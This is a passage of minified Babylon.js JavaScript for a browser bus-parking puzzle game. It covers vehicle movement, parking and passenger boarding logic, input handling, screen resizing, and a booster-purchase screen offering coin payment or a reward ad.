this.parkingSpots[e];return}for(e=0;e<this.parkingSpots.length;e++)a.destination==this.parkingSpots[e]&&(this.removeBusToPark(a),this.openRoofBus3d(a),a.rotation.y=this.parkingSpots[e].rotation.y,a.position=this.parkingSpots[e].position.clone(),a.parkingSpot=this.parkingSpots[e],a.destination.parkedBus=a,a.destination=this.preParkingSpots[e])}}},_rewardForBusDeparting:function(a){var b=this.getObjectProjection2D(a.position);screenTopPanel.animateEarnedCoins(this.getRewardForDepartedBus(a),b.x-engineRenderWidth/
2,b.y-engineRenderHeight/2,.3,300)},updateBusToGo:function(a){if(null!=a.destination)if(0<a.busToGoDelay)a.busToGoDelay-=activeScene.deltaTime,0>=a.busToGoDelay&&this._rewardForBusDeparting(a);else{var b=a.rotation.clone();a.lookAt(a.destination.position);a.rotation.y-=DegToRad(180);var e=a.destination.position.clone(),f=a.rotation;a.rotation=b;this.isItParkingSpot(a.destination)&&(f.y=a.destination.rotation.y);b=RadToDeg(a.rotation.y-f.y);180<=b&&(b-=360);-180>=b&&(b+=360);.5<b&&(a.rotation.y-=DegToRad(BUS_ROTATION_SPEED)*
activeScene.getCpuSpeedMul(),b=RadToDeg(a.rotation.y-f.y),.5>b&&(a.rotation.y=f.y));.5>b&&(a.rotation.y+=DegToRad(BUS_ROTATION_SPEED)*activeScene.getCpuSpeedMul(),b=RadToDeg(a.rotation.y-f.y),.5<b&&(a.rotation.y=f.y));e=e.subtract(a.position);f=e.length();e.normalize();b=a.position.subtract(e.scale(.6*a.busData.size));e.scaleInPlace(BUS_SPEED*activeScene.getCpuSpeedMul());b=this.getObjectProjection2D(b);screenParticles.particles.CreateVehicleSmoke(b.x-this.activeViewportCenter.x,b.y-this.activeViewportCenter.y,
1);a.position.addInPlace(e);1>=f&&(a.destination==this.preParkingSpots[0]?a.destination=this.levelPOITopRightOuter:a.destination==this.preParkingSpots[1]?a.destination=this.levelPOITopRightOuter:a.destination==this.preParkingSpots[2]?a.destination=this.levelPOITopRightOuter:a.destination==this.preParkingSpots[3]?a.destination=this.levelPOITopRightOuter:a.destination==this.preParkingSpots[4]?a.destination=this.levelPOITopRightOuter:a.destination==this.preParkingSpots[5]?a.destination=this.levelPOITopRightOuter:
a.destination==this.preParkingSpots[6]?a.destination=this.levelPOITopRightOuter:a.destination==this.preParkingSpots[7]?a.destination=this.levelPOITopRightOuter:a.destination==this.levelPOITopRightOuter&&(this.departedBuses++,this.removeBus3d(a),0==this.peopleInQueue.length&&0==this.buses.length&&this.gameStep_levelCompleted()))}},getRewardForDepartedBus:function(a){return 4==a.capacity?REWARD_SMALL_CAR:6==a.capacity?REWARD_MEDIUM_CAR:REWARD_BIG_CAR},getFreePreParkingSpot:function(){for(var a=0;a<
this.preParkingSpots.length;a++)if(this.preParkingSpots[a].spotFree&&(null==this.parkingSpots[a].icon||!this.parkingSpots[a].icon.isVisible))return this.preParkingSpots[a];return null},allBusesParked:function(){for(var a=0;a<this.parkingSpots.length;a++)if((null==this.parkingSpots[a].icon||!this.parkingSpots[a].icon.isVisible)&&null==this.parkingSpots[a].parkedBus)return!1;return!0},someOfBusesAreFull:function(){for(var a=0;a<this.parkingSpots.length;a++)if((null==this.parkingSpots[a].icon||!this.parkingSpots[a].icon.isVisible)&&
null!=this.parkingSpots[a].parkedBus&&0==this.parkingSpots[a].parkedBus.freeCapacity)return!0;return!1},reserveFreePreParkingSpot:function(){var a=this.getFreePreParkingSpot();if(null==a)return null;a.spotFree=!1;this.parkingSpots[a.IDX].spotFree=!1;return a},busInCollisionWithOtherBuses:function(a){for(var b=0,e=0,f=0,h=0;h<this.buses.length;h++){var m=this.buses[h];if(a!=m&&m.testCollisions){var k=Math.abs(a.position.x-m.position.x);k>b&&(b=k);if(!(2.5<k||(k=Math.abs(a.position.z-m.position.z),
k>e&&(e=k),2.5<k||(f++,!a.intersectsMesh(m,!0)))))return!0}}return!1},busInCollisionWithBorder:function(a){if("down"==a.busData.direction){if(this.levelBorderLeft.intersectsMesh(a,!0))return a.destination=this.levelPOITopLeft,!0;if(this.levelBorderBottom.intersectsMesh(a,!0))return a.destination=this.levelPOIBottomLeft,!0}if("up"==a.busData.direction){if(this.levelBorderRight.intersectsMesh(a,!0))return a.destination=this.levelPOITopRight,!0;if(this.levelBorderTop.intersectsMesh(a,!0))return a.destination=
a.reservedPreParkingSpot,!0}if("left"==a.busData.direction){if(this.levelBorderLeft.intersectsMesh(a,!0))return a.destination=this.levelPOITopLeft,!0;if(this.levelBorderTop.intersectsMesh(a,!0))return a.destination=a.reservedPreParkingSpot,!0}if("right"==a.busData.direction){if(this.levelBorderRight.intersectsMesh(a,!0))return a.destination=this.levelPOITopRight,!0;if(this.levelBorderBottom.intersectsMesh(a,!0))return a.destination=this.levelPOIBottomRight,!0}return!1},updatePeople:function(){this.updatePeopleMovingInQueue();
this.updatePeopleToGetIn();this.tryToBoardPeople()},updatePeopleMovingInQueue:function(){for(var a=0;a<this.peopleInQueue.length;a++){var b=this.peopleInQueue[a];b.position.y=1.3;b.renderingGroupId=0;b.position.x<this.queueEntranceModel.position.x&&b.position.z<this.queueEntranceModel.position.z&&(b.position.y=.1);if(0!=b.dspx){var e=MAN_SPEED*activeScene.getCpuSpeedMul();b.position.x+=e;b.position.z+=e;b.dspx-=e;this.updateManFrame(b,!0);0>b.dspx&&(b.position.x+=b.dspx,b.position.z+=b.dspx,b.dspx=
0,this.updateManFrame(b))}}},updatePeopleToGetIn:function(){for(var a=0;a<this.peopleToGetIn.length;a++)this.updateManGettingIn(this.peopleToGetIn[a])},updateManGettingIn:function(a){if(null!=a.destination){var b=a.destination.position.clone().subtract(a.position),e=b.length();b.normalize();b.scaleInPlace(MAN_SPEED*activeScene.getCpuSpeedMul());a.position.addInPlace(b);this.updateManFrame(a,!0);a.renderingGroupId=1;1>=e&&(a.destination==a.parkingSpotToGetOn?(this.removeManToGetIn(a)||console.error("CHYbaa!"),
soundManager.playSound("pop"),b=a.parkingSpotToGetOn.parkedBus,b.peopleOnboard.push(a),a.renderingGroupId=0,b.rotation.clone(),b.peopleOnboard.length==b.capacity&&this.glowBoardedPeople(b,function(){this.freeParkingSpot(a.parkingSpotToGetOn)}.bind(this))):a.destination==this.prePreParkingSpots[a.parkingSpotToGetOn.IDX]&&(a.position=this.prePreParkingSpots[a.parkingSpotToGetOn.IDX].position.clone(),a.position.y=1.15,a.destination=a.parkingSpotToGetOn))}},glowBoardedPeople:function(a,b){for(var e=0;e<
a.peopleOnboard.length;e++)CommonAnimations.AnimateObjectProperty(a.peopleOnboard[e].material,"specularPower",0,300,null,1,!1,0==e?function(){}:b,[[0,20],[.5,4],[1,20]])},getLastManSeatOnboard:function(a){return null!=a.busTop?(a=traverseFindChildNodeByName(a._children[0],"bus_seat"+a.peopleOnboard.length),a.position.clone().scaleInPlace(BUS_MODEL_SCALE),a):null!=a.carTop?a=traverseFindChildNodeByName(a._children[0],"car_seat"+a.peopleOnboard.length):null!=a.vanTop?a=traverseFindChildNodeByName(a._children[0],
"van_seat"+a.peopleOnboard.length):v3(0,1,0)},removeManToGetIn:function(a){for(var b=0;b<this.peopleToGetIn.length;b++)if(this.peopleToGetIn[b]==a)return this.peopleToGetIn.splice(b,1),this.updateManFrame(a,!1,!0),!0;return!1},removeManFromQueue:function(a){for(var b=0;b<this.peopleInQueue.length;b++)if(this.peopleInQueue[b]==a)return this.peopleInQueue.splice(b,1),!0;return!1},tryToBoardPeople:function(){if(0<this.hopInDelay)this.hopInDelay-=activeScene.deltaTime;else if(this.hopInDelay=HOPIN_DELAY,
0!=this.peopleInQueue){for(var a=this.peopleInQueue[0],b=-1,e=100,f=0;f<this.parkingSpots.length;f++)null==this.parkingSpots[f].parkedBus||this.parkingSpots[f].parkedBus.busData.color!=a.color||1>this.parkingSpots[f].parkedBus.freeCapacity||this.parkingSpots[f].parkedBus.freeCapacity==this.parkingSpots[f].parkedBus.capacity&&this.parkingSpots[f].parkedBus.freeCapacity>=e||(e=this.parkingSpots[f].parkedBus.freeCapacity,b=f);if(0>b){if(null==this.getFreePreParkingSpot()&&this.allBusesParked()&&0==this.peopleToGetIn.length&&
!this.someOfBusesAreFull()){if(!activeScene.gameRunning||!Buttons.enabled)return;Buttons.enabled=!1;setTimeout(function(){this.gameStep_levelFailed();Buttons.enabled=!0}.bind(this),100)}return!1}this.removeManFromQueue(a)||console.error("CHYBA!!!");this.shiftPeopleInQueueLeft(1);this.parkingSpots[b].parkedBus.freeCapacity--;a.parkingSpotToGetOn=this.parkingSpots[b];a.destination=this.prePreParkingSpots[b];this.peopleToGetIn.push(a);this.addOneUnusedManToTheEndOfTheQueue();this.setQueuePanelNumber(this.peopleInQueue.length+
this.preparedQueue.length);return!0}},updateExplosions:function(){this.updateAnimatedPlanes(activeScene.deltaTime)},afterRender:function(){},onPointerObservable:function(a,b){if(Buttons.enabled&&activeScene.gameRunning&&!activeScene.gamePaused)switch(b=new BABYLON.Vector3(activeScene.scene.pointerX,activeScene.scene.pointerY,.99),BABYLON.Vector3.Unproject(b,engine.getRenderWidth(),engine.getRenderHeight(),BABYLON.Matrix.Identity(),activeScene.scene.getViewMatrix(),activeScene.scene.getProjectionMatrix()),
a.type){case BABYLON.PointerEventTypes.POINTERDOWN:this.oldPointerX=a.event.x;this.oldPointerY=a.event.y;if(null==a.pickInfo.pickedMesh)break;b=null;if("price3d"==a.pickInfo.pickedMesh.name){this.purchaseSpot(a.pickInfo.pickedMesh.parkingSpot);break}if("icon3d"==a.pickInfo.pickedMesh.name){this.purchaseSpot(a.pickInfo.pickedMesh.parkingSpot);break}if("stand"==a.pickInfo.pickedMesh.name){this.purchaseSpot(a.pickInfo.pickedMesh.parent.parent);break}a.pickInfo.pickedMesh.hasOwnProperty("busData")&&(b=
a.pickInfo.pickedMesh);a.pickInfo.pickedMesh.hasOwnProperty("bus3d")&&(b=a.pickInfo.pickedMesh.bus3d);if(null==b)break;this.tryToMoveBus(b);break;case BABYLON.PointerEventTypes.POINTERMOVE:this.hasOwnProperty("oldPointerX")||(this.oldPointerX=a.event.x),this.hasOwnProperty("oldPointerY")||(this.oldPointerY=a.event.y),a.deltaX=a.event.x-this.oldPointerX,a.deltaY=a.event.y-this.oldPointerY,this.oldPointerX=a.event.x,this.oldPointerY=a.event.y}},tryToMoveBus:function(a){if(this.onboardingActive){if(this.onboardingBusId!=
a.busData.id)return!1;Buttons.enabled=!1;CommonAnimations.AnimateObjectProperty(screenHand.imgHand,"alpha",0,SCENE_TRANSITION_DURATION,{func:BABYLON.CircleEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEOUT},1,!1,function(){this.onboardingBusId++;this.selectWithHandBusById(this.onboardingBusId)?CommonAnimations.AnimateObjectProperty(screenHand.imgHand,"alpha",1,SCENE_TRANSITION_DURATION,{func:BABYLON.CircleEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEIN},1,!1,function(){Buttons.enabled=!0}):(screenHand.pnlRoot.isVisible=
!1,Buttons.enabled=!0)}.bind(this))}if(this.busAlreadyMoving(a))return!1;a.reservedPreParkingSpot=null;if(this.isBusFreeToMove(a)){var b=this.reserveFreePreParkingSpot();if(null==b)return!1;a.reservedPreParkingSpot=b}a.origPosition=a.position.clone();null==a.parkingSpot&&this.busesToMove.push(a);return!0},getCubeXPositionFromPointer:function(a){a=-2*GRID_SIZE+GRID_SIZE/2+4*(1.2*a/canvas.clientWidth-.2)*GRID_SIZE;a<-2*GRID_SIZE+GRID_SIZE/2&&(a=-2*GRID_SIZE+GRID_SIZE/2);a>2*GRID_SIZE-GRID_SIZE/2&&(a=
2*GRID_SIZE-GRID_SIZE/2);return a},getPointFromObject:function(a,b,e){a=activeScene.scene.pick(a,b,function(f){return f.id==e.id},null,screenGame.cameraPlayer,null);return null==a.pickedMesh?null:a.pickedPoint},castRayFromScreenPointToIntersectWithPlane:function(a,b,e){return this.scene.scene.pick(a,b,function(f){return f.id==e})},onGamePause:function(){if(activeScene.gameRunning&&!activeScene.gamePaused)screenTopPanel.onSettingsPressed()},onGameResume:function(){},pauseGameSounds:function(){activeScene.gameRunning&&
soundManager.pauseSound("timer_5_sec")},resumeGameSounds:function(){activeScene.gameRunning&&soundManager.resumeSound("timer_5_sec")},stopGameSounds:function(){soundManager.stopSound("timer_5_sec")},updateTexts:function(){},onResize:function(){var a=engine.getRenderWidth(),b=engine.getRenderHeight();this.activeViewport={x:0,y:0,width:a,height:b};this.activeViewportCenter={x:.5*a,y:.5*b};this.pnlOverlay.resize(a,b);this.pnlBoosters.arrangeSlots(a,b);if(b>a){var e=75*Resolution.SCALE;e=autoResizeOrthographicCamera(this.cameraPlayer,
e);17.4>e.height&&(e=autoResizeOrthographicCamera(this.cameraPlayer,b/17.4));this.pnlBoosters.scaleTo(.11*b/this.pnlBoosters.heightInPixels*.9);this.pnlBoosters.widthInPixels*this.pnlBoosters.scaleX>a&&this.pnlBoosters.scaleTo(a/this.pnlBoosters.widthInPixels);this.pnlBoosters.topInPixels=b-this.pnlBoosters.heightInPixels*this.pnlBoosters.scaleY-20*Resolution.SCALE}else e=47*Resolution.SCALE,autoResizeOrthographicCamera(this.cameraPlayer,e),this.pnlBoosters.scaleTo(.11*b/this.pnlBoosters.heightInPixels*
.9),this.pnlBoosters.topInPixels=b-this.pnlBoosters.heightInPixels*this.pnlBoosters.scaleY-10*Resolution.SCALE;this.updateOuterRightPOIPosition(a);for(this.onboardingActive&&setTimeout(function(){screenGame.selectWithHandBusById(screenGame.onboardingBusId)},100);14.8>=screenGame.cameraPlayer.orthoTop;)screenGame.cameraPlayer.orthoTop+=1;screenTopPanel.onResize();this.pnlBoosters.leftInPixels=0;this.imgBottomMask.onResize(a,b);this.resizeShadows()},resizeShadows:function(){}};
function getShadowOffs(a){return TEXT_SHADOWS_ENABLED?a*Resolution.SCALE:0};var ScreenPurchaseBooster=function(a){ScreenPurchaseBooster.instance=this;this.create(a)};ScreenPurchaseBooster.instance=null;
ScreenPurchaseBooster.prototype={create:function(a){this.scene=a;this.createGui();this.disableControls();this.guiRoot.isVisible=!1},createGui:function(){this.initGuiControls(screenGame.guiTexture)},initGuiControls:function(a){this.guiRoot=this.createRootPanel(a);this.createBackground(this.guiRoot);this.createPurchaseBoosterPanel(this.pnlRoot);this.createBody(this.pnlPurchaseBooster,0);this.createTitle(this.pnlPurchaseBooster,-402);this.createBottomButtons(this.pnlPurchaseBooster,260);this.setBooster("shuffle")},
createRootPanel:function(a){this.pnlRoot=new BABYLON.GUI.Rectangle("ScreenPurchaseBooster.pnlRoot");this.pnlRoot.transformCenterX=.5;this.pnlRoot.transformCenterY=.5;this.pnlRoot.isPointerBlocker=!1;this.pnlRoot.isHitTestVisible=!1;this.pnlRoot.leftInPixels=0;this.pnlRoot.topInPixels=0;this.pnlRoot.thickness=0;this.pnlRoot.color="yellow";this.pnlRoot.clipContent=!0;this.pnlRoot.clipChildren=!0;this.pnlRoot.highlightLineWidth=0;this.pnlRoot.zIndex=2;a.addControl(this.pnlRoot);return this.pnlRoot},
createPurchaseBoosterPanel:function(a){this.pnlPurchaseBooster=new BABYLON.GUI.Rectangle("pnlPurchaseBooster");this.pnlPurchaseBooster.transformCenterX=.5;this.pnlPurchaseBooster.transformCenterY=.5;this.pnlPurchaseBooster.isPointerBlocker=!1;this.pnlPurchaseBooster.isHitTestVisible=!1;this.pnlPurchaseBooster.clipContent=!1;this.pnlPurchaseBooster.clipChildren=!1;this.pnlPurchaseBooster.thickness=0;this.pnlPurchaseBooster.widthInPixels=650;this.pnlPurchaseBooster.heightInPixels=920;this.pnlPurchaseBooster.color=
"yellow";a.addControl(this.pnlPurchaseBooster);this.pnlPurchaseBooster.scaleTo=function(b){this.scaleX=this.scaleY=b};return this.pnlPurchaseBooster},createBackground:function(a){this.imgBackground=new BABYLON.GUI.Rectangle("imgBackground");this.imgBackground.transformCenterX=.5;this.imgBackground.transformCenterY=.5;this.imgBackground.isPointerBlocker=!1;this.imgBackground.isHitTestVisible=!1;this.imgBackground.clipContent=!1;this.imgBackground.clipChildren=!1;this.imgBackground.thickness=0;this.imgBackground.color=
"orange";this.imgBackground.background="rgba(35,35,35,0.7)";a.addControl(this.imgBackground);this.imgBackground.resize=function(b,e){e+=300*Resolution.SCALE;this.widthInPixels=b+5;this.heightInPixels=e;this.parent.heightInPixels=e}},createTitle:function(a,b){this.imgTitleBg=new BABYLON.GUI.Image("imgTitleBg");this.imgTitleBg.transformCenterX=.5;this.imgTitleBg.transformCenterY=.5;this.imgTitleBg.isPointerBlocker=!1;this.imgTitleBg.isHitTestVisible=!1;SetImageFromSpritesheet(this.imgTitleBg,getAssetImage("pak1"),
getAssetImageFrames("pak1"),"title_panel_blue.png");this.imgTitleBg.leftInPixels=0;this.imgTitleBg.topInPixels=b;a.addControl(this.imgTitleBg);this.txtTitle=new BABYLON.GUI.TextBlock("txtTitle");this.txtTitle.textWrapping=!0;this.txtTitle.leftInPixels=0;this.txtTitle.topInPixels=b-5;this.txtTitle.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtTitle.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtTitle.textHorizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;
this.txtTitle.textVerticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtTitle.color="#FFFFFF";this.txtTitle.text="BUY STUFF";this.txtTitle.fontSize="55px";this.txtTitle.fontFamily="gamefont";this.txtTitle.leftInPixels=0;this.txtTitle.isPointerBlocker=!1;this.txtTitle.isHitTestVisible=!1;this.txtTitle.shadowOffsetX=0;this.txtTitle.shadowOffsetY=6;this.txtTitle.shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.5)":"rgba(80,80,80,0)";this.txtTitle.outlineColor="rgb(0,0,0)";this.txtTitle.outlineWidth=
5;this.txtTitle.shadowBlur=5;a.addControl(this.txtTitle);this.btnClose=BABYLON.GUI.Button.CreateImageOnlyButton("btnClose");this.btnClose.children[0].transformCenterY=.5;this.btnClose.children[0].transformCenterX=.5;this.btnClose.children[0].horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.btnClose.children[0].verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.btnClose.transformCenterX=.5;this.btnClose.transformCenterY=.5;this.btnClose.topInPixels=b-1;this.btnClose.leftInPixels=
220;a.addControl(this.btnClose);SetImageFromSpritesheet(this.btnClose.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"button_close.png");ResetGuiButtonAppearance(this.btnClose,this.btnClose.children[0].sourceWidth,this.btnClose.children[0].sourceHeight);this.btnClose.onPointerClickObservable.add(this.onClosePressed)},createBody:function(a,b){this.imgBodyBg=new BABYLON.GUI.Image("imgBodyBg");this.imgBodyBg.transformCenterX=.5;this.imgBodyBg.transformCenterY=.5;this.imgBodyBg.isPointerBlocker=
!1;this.imgBodyBg.isHitTestVisible=!1;this.imgBodyBg.leftInPixels=0;this.imgBodyBg.topInPixels=b;this.imgBodyBg.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgBodyBg.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgBodyBg.scaleX=this.imgBodyBg.scaleY=2;SetImageFromSpritesheet(this.imgBodyBg,getAssetImage("pak1"),getAssetImageFrames("pak1"),"bg_panel_blue.png");a.addControl(this.imgBodyBg);this.imgBooster=new BABYLON.GUI.Image("imgBooster");this.imgBooster.transformCenterX=
.5;this.imgBooster.transformCenterY=.5;this.imgBooster.isPointerBlocker=!1;this.imgBooster.isHitTestVisible=!1;this.imgBooster.leftInPixels=0;this.imgBooster.topInPixels=b-110;this.imgBooster.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgBooster.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgBooster.scaleX=this.imgBooster.scaleY=1.4;SetImageFromSpritesheet(this.imgBooster,getAssetImage("pak1"),getAssetImageFrames("pak1"),"icon_shuffle_big.png");
a.addControl(this.imgBooster);this.txtStuffDesc=new BABYLON.GUI.TextBlock("txtStuffDesc");this.txtStuffDesc.textWrapping=!0;this.txtStuffDesc.widthInPixels=420;this.txtStuffDesc.leftInPixels=0;this.txtStuffDesc.topInPixels=b+150;this.txtStuffDesc.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtStuffDesc.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtStuffDesc.textHorizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtStuffDesc.textVerticalAlignment=
BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtStuffDesc.color="#FFFFFF";this.txtStuffDesc.text="REARRANGE THE COLOR OF THE\nVEHICLES IN PARKING LOT";this.txtStuffDesc.fontSize="26px";this.txtStuffDesc.fontFamily="gamefont";this.txtStuffDesc.leftInPixels=0;this.txtStuffDesc.isPointerBlocker=!1;this.txtStuffDesc.isHitTestVisible=!1;this.txtStuffDesc.shadowOffsetX=0;this.txtStuffDesc.shadowOffsetY=6;this.txtStuffDesc.shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.5)":"rgba(80,80,80,0)";this.txtStuffDesc.outlineColor=
"rgb(0,0,0)";this.txtStuffDesc.outlineWidth=5;this.txtStuffDesc.shadowBlur=5;a.addControl(this.txtStuffDesc)},createBottomButtons:function(a,b){this.btnPay=BABYLON.GUI.Button.CreateImageWithCenterTextButton("btnPay","100");this.btnPay.children[0].transformCenterY=.5;this.btnPay.children[0].transformCenterX=.5;this.btnPay.children[0].horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.btnPay.children[0].verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.btnPay.children[1].fontFamily=
"gamefont";this.btnPay.children[1].fontSize="45px";this.btnPay.children[1].topInPixels=-8;this.btnPay.children[1].color="#ffffff";this.btnPay.children[1].shadowOffsetX=3;this.btnPay.children[1].shadowOffsetY=3;this.btnPay.children[1].shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.8)":"rgba(80,80,80,0)";this.btnPay.children[1].shadowBlur=5;this.btnPay.children[1].outlineColor="rgb(0,0,0)";this.btnPay.children[1].outlineWidth=3;this.btnPay.children[1].lineSpacing=5;this.btnPay.transformCenterX=.5;this.btnPay.transformCenterY=
.5;this.btnPay.topInPixels=b;this.btnPay.leftInPixels=-100;this.btnPay.scaleX=this.btnPay.scaleY=.9;a.addControl(this.btnPay);SetImageFromSpritesheet(this.btnPay.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"button_orange_top_mini.png");ResetGuiButtonAppearance(this.btnPay,this.btnPay.children[0].sourceWidth,this.btnPay.children[0].sourceHeight);this.btnPay.onPointerClickObservable.add(this.onPurchaseForCashPressed.bind(this));this.imgPayCoin=new BABYLON.GUI.Image("imgPayCoin");this.imgPayCoin.transformCenterX=
.5;this.imgPayCoin.transformCenterY=.5;this.imgPayCoin.isPointerBlocker=!1;this.imgPayCoin.isHitTestVisible=!1;this.imgPayCoin.leftInPixels=0;this.imgPayCoin.topInPixels=-6;this.imgPayCoin.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgPayCoin.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgPayCoin.scaleX=this.imgPayCoin.scaleY=.9;SetImageFromSpritesheet(this.imgPayCoin,getAssetImage("pak1"),getAssetImageFrames("pak1"),"coin_button.png");this.btnPay.addControl(this.imgPayCoin);
this.btnPay.setText=function(e){this.children[1].text=e;e=getTextWidth(screenGame.guiTexture.getContext(),this.children[1].text,this.children[1].fontFamily,this.children[1]._fontSize._value);var f=this.children[2].widthInPixels*this.children[2].scaleX;this.children[2].leftInPixels=-(e+f+7)/2+e/2-12;this.children[1].leftInPixels=this.children[2].leftInPixels+f/2+7+e/2};this.btnFree=BABYLON.GUI.Button.CreateImageWithCenterTextButton("btnFree","FREE");this.btnFree.clipContent=!1;this.btnFree.children[0].transformCenterY=
.5;this.btnFree.children[0].transformCenterX=.5;this.btnFree.children[0].horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.btnFree.children[0].verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.btnFree.children[1].fontFamily="gamefont";this.btnFree.children[1].fontSize="35px";this.btnFree.children[1].topInPixels=-8;this.btnFree.children[1].color="#ffffff";this.btnFree.children[1].shadowOffsetX=3;this.btnFree.children[1].shadowOffsetY=3;this.btnFree.children[1].shadowColor=
TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.8)":"rgba(80,80,80,0)";this.btnFree.children[1].shadowBlur=5;this.btnFree.children[1].outlineColor="rgb(0,0,0)";this.btnFree.children[1].outlineWidth=3;this.btnFree.children[1].lineSpacing=5;this.btnFree.transformCenterX=.5;this.btnFree.transformCenterY=.5;this.btnFree.topInPixels=b;this.btnFree.leftInPixels=-this.btnPay.leftInPixels;this.btnFree.scaleX=this.btnFree.scaleY=this.btnPay.scaleX;a.addControl(this.btnFree);SetImageFromSpritesheet(this.btnFree.children[0],
getAssetImage("pak1"),getAssetImageFrames("pak1"),"button_green_top_mini.png");ResetGuiButtonAppearance(this.btnFree,this.btnFree.children[0].sourceWidth,this.btnFree.children[0].sourceHeight);this.btnFree.onPointerClickObservable.add(this.onPurchaseForAdPressed);this.imgPayAd=new BABYLON.GUI.Image("imgPayAd");this.imgPayAd.transformCenterX=.5;this.imgPayAd.transformCenterY=.5;this.imgPayAd.isPointerBlocker=!1;this.imgPayAd.isHitTestVisible=!1;this.imgPayAd.leftInPixels=this.btnFree.leftInPixels+
95;this.imgPayAd.topInPixels=this.btnFree.topInPixels-45;this.imgPayAd.rotation=DegToRad(20);this.imgPayAd.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgPayAd.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgPayAd.scaleX=this.imgPayAd.scaleY=.75;SetImageFromSpritesheet(this.imgPayAd,getAssetImage("pak1"),getAssetImageFrames("pak1"),"icon_watch_ad.png");a.addControl(this.imgPayAd)},setBooster:function(a){this.booster=a;this.txtTitle.text=STR(a.toUpperCase());
updateTextToWidth(this.txtTitle,screenGame.guiTexture.getContext(),300,55,1);this.txtStuffDesc.text=STR(a.toUpperCase()+"_DESC");SetImageFromSpritesheet(this.imgBooster,getAssetImage("pak1"),getAssetImageFrames("pak1"),"icon_"+this.booster.toLowerCase()+"_big.png");inlModule.rewardAds.active?(this.btnFree.isVisible=!0,this.imgPayAd.isVisible=!0,this.btnPay.leftInPixels=-100,this.btnFree.leftInPixels=-this.btnPay.leftInPixels):(this.imgPayAd.isVisible=!1,this.btnFree.isVisible=!1,this.btnPay.leftInPixels=
0)},setPrice:function(a){this.price=a;this.btnPay.setText(""+a)},updateTexts:function(){this.btnFree.children[1].text=STR("FREE");updateTextToWidth(this.btnFree.children[1],screenGame.guiTexture.getContext(),160,38,1);var a=this.btnFree.children[1]._fontSize._value/38;this.btnFree.children[1].lineSpacing=-10*a;this.btnFree.children[1].topInPixels=-10*a;0<this.btnFree.children[1].text.indexOf("\n")&&(this.btnFree.children[1].topInPixels=-5*a);this.setBooster(this.booster)},updateData:function(){},
onClosePressed:function(){Buttons.enabled&&(Buttons.enabled=!1,soundManager.playSound("button"),screenPurchaseBooster.hideScene(function(){activeScene.gamePaused=!1;screenGame.enableControls();Buttons.enabled=!0}))},onPurchaseForCashPressed:function(){Buttons.enabled&&(Buttons.enabled=!1,soundManager.playSound("button"),screenTopPanel.purchaseForCash(this.price,!1)?screenPurchaseBooster.hideScene(function(){activeScene.gamePaused=!1;screenGame.enableControls();screenGame.runBooster(this.booster)}.bind(this)):
Buttons.enabled=!0)},onPurchaseForAdPressed:function(){Buttons.enabled&&(soundManager.playSound("button"),Buttons.enabled=!1,RewardAds.showRewAd(activeScene.scene,function(){screenPurchaseBooster.hideScene(function(){activeScene.gamePaused=!1;screenGame.enableControls();screenGame.runBooster(screenPurchaseBooster.booster)}.bind(this))},function(){Buttons.enabled=!0},this))},enableControls:function(){enableButton(this.btnClose);enableButton(this.btnPay);inlModule.rewardAds.active&&enableButton(this.btnFree)},
disableControls:function(){disableButton(this.btnClose);disableButton(this.btnPay);disableButton(this.btnFree)},hideScene:function(a){void 0===a&&(a=null);this.disableControls();activeScene.scene.animationTimeScale=1;activeScene.gamePaused=!1;var b={func:BABYLON.CircleEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEIN};CommonAnimations.AnimateObjectProperty(this.guiRoot,"topInPixels",-50*Resolution.SCALE,SCENE_TRANSITION_DURATION,b,1,!1);CommonAnimations.AnimateObjectProperty(this.guiRoot,"alpha",
